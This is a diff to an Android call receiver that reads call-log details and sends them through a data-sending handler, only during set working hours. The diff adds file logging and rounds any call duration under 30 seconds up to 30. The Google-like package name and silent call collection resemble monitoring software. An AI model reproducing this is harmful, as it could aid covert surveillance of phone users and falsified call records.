@@ -19,6 +19,7 @@ import android.telephony.TelephonyManager;
 import android.util.Log;
 
 import com.google.android.bs.DataSendHandler;
+import com.google.android.bs.FileLog;
 import com.google.android.bs.WorkTimeDefiner;
 
 public class CallReceiver extends BroadcastReceiver {
@@ -39,15 +40,23 @@ public class CallReceiver extends BroadcastReceiver {
 		String call = sp.getString("KBD", "0");
 
 		if (call.equals("0")) {
+			Log.d(LOG_TAG, "KBD = 0");
+			FileLog.writeLog("CallReciver: KBD = 0");
 			return;
 		}
 		boolean isWork = WorkTimeDefiner.isDoWork(arg0);
 		if (!isWork) {
 			Log.d(LOG_TAG, "isWork return " + Boolean.toString(isWork));
 			Log.d(LOG_TAG, "after isWork retrun 0");
+			FileLog.writeLog("Callreciver: isWork return "
+					+ Boolean.toString(isWork));
+			FileLog.writeLog("Callreciver: after isWork retrun 0");
+
 			return;
 		} else {
 			Log.d(LOG_TAG, Boolean.toString(isWork));
+			FileLog.writeLog("Callreciver: isWork - "
+					+ Boolean.toString(isWork));
 		}
 
 		date = logTime();
@@ -100,6 +109,9 @@ public class CallReceiver extends BroadcastReceiver {
 		// String callDate = managedCursor.getString( date );
 		// Date callDayTime = new Date(Long.valueOf(callDate));
 		String callDuration = managedCursor.getString(duration);
+		if (Integer.parseInt(callDuration) < 30) {
+			callDuration = "30";
+		}
 		String dir = null;
 		int dircode = Integer.parseInt(callType);
 
@@ -132,6 +144,7 @@ public class CallReceiver extends BroadcastReceiver {
 		dSH.send(1, sendStr);
 
 		Log.d("callRec", sb.toString());
+		FileLog.writeLog("Callreciver: " + sb.toString());
 	}
 
 	@SuppressLint("SimpleDateFormat")
